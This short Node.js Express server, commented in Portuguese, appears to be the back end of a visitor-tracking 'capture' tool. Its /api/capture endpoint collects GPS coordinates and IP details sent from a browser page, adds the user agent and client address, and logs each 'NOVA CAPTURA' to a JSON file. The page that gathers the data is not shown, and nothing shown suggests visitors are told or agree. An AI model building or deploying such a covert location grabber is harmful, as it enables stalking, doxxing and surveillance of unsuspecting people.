const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const LOG_FILE = path.join(__dirname, 'captured_logs.json');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Initialize log file
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, '[]', 'utf-8');
}

app.post('/api/capture', (req, res) => {
  const data = {
    timestamp: new Date().toISOString(),
    ip_info: req.body.ip_info || null,
    gps: req.body.gps || null,
    userAgent: req.headers['user-agent'],
    forwardedFor: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
  };

  console.log('\n========== NOVA CAPTURA ==========');
  console.log(JSON.stringify(data, null, 2));
  console.log('==================================\n');

  // Append to log file
  let logs = [];
  try {
    logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf-8'));
  } catch { /* empty */ }
  logs.push(data);
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2), 'utf-8');

  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
